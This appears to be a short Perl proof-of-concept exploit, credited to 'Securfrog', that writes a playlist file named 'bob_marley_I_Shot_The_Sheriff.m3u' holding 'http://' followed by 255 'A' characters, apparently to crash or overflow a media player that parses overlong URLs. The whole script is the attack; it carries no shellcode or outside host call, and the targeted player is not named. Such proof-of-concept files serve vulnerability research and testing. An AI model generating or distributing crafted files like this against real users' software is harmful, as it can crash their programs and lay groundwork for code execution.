my $file="bob_marley_I_Shot_The_Sheriff.m3u";

open(my $FILE, ">>$file") or die "Cannot open $file: $!";

print $FILE "http://"."A" x 255;

close($FILE);

print "$file has been created \n";

print "Credits:Securfrog";

